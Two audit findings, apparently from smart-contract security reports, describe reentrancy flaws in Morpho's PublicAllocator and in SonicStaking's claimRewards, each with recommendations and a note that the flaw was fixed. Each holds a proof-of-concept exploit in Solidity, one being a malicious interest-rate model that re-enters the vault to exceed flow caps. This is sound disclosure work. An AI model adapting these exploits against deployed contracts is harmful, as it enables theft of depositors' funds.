PublicAllocator Overview
Context
PublicAllocator.sol#L102-L149
Description
To solve the liquidity fragmentation on MetaMorpho, the
publicAllocator
allows anyone to move the funds within the pre-configured limit. These limits are checked in the
reallocateTo
function to avoid funds being moved to an authorized market and putting MetaMorpho in an undesired state.
In the
reallocateTo
function, a special case arises when
withdrawnAssets == 0
. In this scenario, the function allows processing any market as long as no funds are withdrawn or supplied to/from the market. However, this introduces a potential attack vector. Similar to the issue "Allocator can drain the MetaMorpho vault if a future IRM queries token balance", the
publicAllocator
calls
morpho.accrueInterests
in the loop, potentially exposing the control flow to malicious users.
Currently, the
AdaptiveCurveIrm
is the only enabled IRM, which wouldn't give users control flow and thus prevent potential attacks. However, consider two hypothetical scenarios:
A new IRM is deployed that queries token balances to calculate interest. (This is a reasonable setting, as many IRM systems actually depend on a token's balance).
Morpho-blue allows users to permissionlessly deploy their own IRMs.
In both cases, a malicious user can gain control within the
reallocateTo
function, suggesting a potential issue with the validation in the function. The
publicAllocator
determines the end allocation amount based on
MORPHO.expectedSupplyAssets
and the withdrawal amount. If
expectedSupplyAssets
changes after the value is cached, it can lead to different actual allocations. Consequently,
publicAllocator
may distribute more funds than the limit specified by
flowCaps
.
Proof of Concept
----new code block----
contract IrmMock is IIrm {
 uint256 public apr;
 address public vault;
 uint public depositAmount;
 address public loanToken;
​
 function setApr(uint256 newApr) external {
        apr = newApr;
    }
​
 function borrowRateView(MarketParams memory, Market memory) public view returns (uint256) {
 return apr / 365 days;
    }
​
 function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {
 if(depositAmount != 0) {
            IMetaMorpho vault = IMetaMorpho(vault);
            IERC20(loanToken).approve(address(vault), depositAmount);
            vault.deposit(depositAmount, address(this));
        }
 return borrowRateView(marketParams, market);
    }
​
 function setMMAddress(address _mm) external {
        vault = _mm;
    }
​
 function setDepositAmount(uint256 amount) external {
        depositAmount = amount;
    }
​
 function setLoanToken(address _loanToken) external {
        loanToken = _loanToken;
    }
}
​
function createFakeMarket() internal returns(MarketParams memory) {
 // create mock IRM
    IrmMock irm = new IrmMock();
    irm.setApr(1e18);

 // enable irm on morpho
    vm.prank(MORPHO_OWNER);
    morpho.enableIrm(address(irm));

 // create market
    MarketParams memory marketParams = MarketParams({
        loanToken: address(loanToken),
        collateralToken: address(loanToken),
        oracle: address(0),
        irm: address(irm),
        lltv: 0
    });

    morpho.createMarket(marketParams);
 return marketParams;
}
​
function testReentrancyAttackFromPublicAllocator() public {
    _setCap(allMarkets[0], type(uint184).max);

    MarketAllocation[] memory allocations = new MarketAllocation[](3);
    allocations[0] = MarketAllocation(idleParams, 0);
    allocations[1] = MarketAllocation(allMarkets[0], INITIAL_DEPOSIT);
    allocations[2] = MarketAllocation(allMarkets[1], 0);

    vm.prank(ALLOCATOR);
    vault.reallocate(allocations);

    Id firstMarket = allMarkets[0].id();
    MarketParams memory fakeParam;

 for(uint i = 0; i < 255; i++) {
        fakeParam = createFakeMarket();
 if(Id.unwrap(fakeParam.id()) > Id.unwrap(firstMarket)) {
 break;
        }
    }

    IrmMock irm = IrmMock(fakeParam.irm);
    irm.setDepositAmount(totalAssets);
    irm.setLoanToken(address(loanToken));
    irm.setMMAddress(address(vault));

    deal(address(loanToken), address(irm), totalAssets);
    vm.warp(block.timestamp + 1 days);

    withdrawals.push(Withdrawal(allMarkets[0], 0));
    withdrawals.push(Withdrawal(fakeParam, 0));

    totalAssets = vault.totalAssets();
    totalShares = vault.totalSupply();

 uint previousIdleAssets = IMorpho(morpho).expectedSupplyAssets(idleParams, address(vault));

 // currentPrice is less than previousPrice
    publicAllocator.reallocateTo(address(vault), withdrawals, idleParams);

 uint currentIdleAssets = IMorpho(morpho).expectedSupplyAssets(idleParams, address(vault));

 // Logs:
 // previousIdleAssets: 0
 // currentIdleAssets: 400000000000000000000
 //
    assertLt(previousIdleAssets, currentIdleAssets);
}
----end of code block ----
Recommendation
Recommend adding more sanity checks in
reallocateTo
, following the recommendations in the issue "reallocateTo should perform more sanity checks on the input parameters and vault's configuration".
References
Morpho: Addressed in PR 28.
Cantina Managed: The recommendation has been implemented in PR 28. Now it’s not possible to withdraw from or supply to a non-enabled market.

Summary of Findings
Severity
Low Risk
Context
SonicStaking.sol#L318
SonicStaking.sol#L387
SonicStaking.sol#L669
SonicStaking.sol#L690
Description
There is a reentrancy risk in
claimRewards()
:
Assume the treasury wants to be proactive and immediately
deposit()
the fee back into the SonicStaking protocol.
The treasury gains control at
treasury.call{...}("")
of
claimRewards()
and can initiate further actions.
The treasury can directly call
deposit()
, which lacks a
nonReentrant
modifier (see the proof of concept below).
The
totalPool
is adjusted right after the external call, making the shares relatively cheap during the external call.
By calling
deposit()
, the treasury will acquire more shares compared to if it had executed the deposit at a later time.
Although the treasury is trusted, it could still act in a well-intentioned manner.
Additionally,
undelegateFromPool()
could also be invoked, leading to read-only reentrancy risks. The following view functions could be called and would yield inaccurate results:
getRate()
totalAssets()
convertToShares()
convertToAssets()
Proof of Concept
----new code block----
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
​
contract Testcontract {
 uint totalPool = 10e18;
 uint totalSupply = 10e18;
 uint treasuryShares;
​
 function totalAssets() public view returns (uint256) {
 return totalPool;
    }
​
 function convertToShares(uint256 assetAmount) public view returns (uint256) {
 uint256 assetsTotal = totalAssets();
 uint256 totalShares = totalSupply;
 return (assetAmount * totalShares) / assetsTotal;
    }
​
 function convertToAssets(uint256 sharesAmount) public view returns (uint256) {
 uint256 assetsTotal = totalAssets();
 uint256 totalShares = totalSupply;
 return (sharesAmount * assetsTotal) / totalShares;
    }
​
 function deposit(uint amount) public payable returns (uint) {
 uint256 sharesAmount = convertToShares(amount);
        totalPool += amount;
        totalSupply += sharesAmount; // equivalent of mint
 return sharesAmount;
    }
​
 function claimRewards(uint totalRewardsClaimed) public {
        treasuryShares += deposit(totalRewardsClaimed); // simulate the treasury directly deposits
        totalPool += totalRewardsClaimed; // this is done after the external call
    }
​
 constructor() {
 uint totalRewardsClaimed = 1e18;
        claimRewards(totalRewardsClaimed);
        console.log("TotalRewardsClaimed %s * 1e16", totalRewardsClaimed / 1e16);
        console.log("Converted to shares and back to assets %s * 1e16", convertToAssets(treasuryShares) / 1e16);
 // TotalRewardsClaimed 100 * 1e16
 // Converted to shares and back to assets 109 * 1e16
    }
}
----end of code block ----
Recommendation
Consider the following adjustments:
Adjust
totalPool
before the external call.
Additionally, consider adding the
nonReentrant
modifier to
deposit()
and
undelegateFromPool()
.
Related PRs
Beethoven:
undelegateFromPool
nonReentrant in PR 42.
deposit
nonReentrant in PR 55.
Moved accounting for
totalPool
in PR 58.
Spearbit: Fixed.

